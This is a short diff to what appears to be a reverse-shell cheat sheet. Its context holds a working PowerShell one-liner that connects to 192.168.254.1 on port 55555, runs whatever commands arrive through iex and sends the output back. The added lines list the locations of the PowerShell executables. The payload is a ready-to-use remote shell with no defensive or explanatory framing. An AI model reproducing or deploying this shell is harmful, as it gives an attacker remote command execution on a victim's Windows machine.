@@ -9,3 +9,9 @@ or
 ```powershell
 $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 ```
+
+Powershell Locations
+		
+		C:\windows\syswow64\windowspowershell\v1.0\powershell
+		C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+
